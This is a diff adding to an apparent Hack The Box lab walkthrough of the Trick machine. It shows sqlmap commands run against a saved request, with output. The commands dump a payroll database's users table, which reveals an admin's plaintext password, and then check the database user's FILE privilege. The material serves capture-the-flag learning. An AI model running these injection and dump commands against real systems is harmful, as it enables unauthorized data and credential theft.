@@ -319,4 +319,44 @@ Database: payroll_db
 +---------------------+
 ```
 
+Next, let's dump the `Users` table. With `--dump` option, I can dump the whole contents from the table.
 
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ sqlmap -r req.txt --batch --threads 10 -D payroll_db -T users --dump
+
+<SNIP>
+
+Database: payroll_db
+Table: users
+[1 entry]
++----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+| id | doctor_id | name          | type   | address | contact | password              | username   |
++----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+| 1  | 0         | Administrator | 1      | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
++----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+```
+
+Current user & Privileges of the current user
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ sqlmap -r req.txt --batch --threads 10 --current-user 
+
+<SNIP>
+remo@localhost
+current user: 'remo@localhost'
+[23:01:09] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'  
+
+
+┌──(kali㉿kali)-[~/htb]
+└─$ sqlmap -r req.txt --batch --threads 10 --privileges 
+
+<SNIP>
+
+database management system users privileges:
+[*] %remo% [1]:
+    privilege: FILE
+
+[22:57:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'   
+```
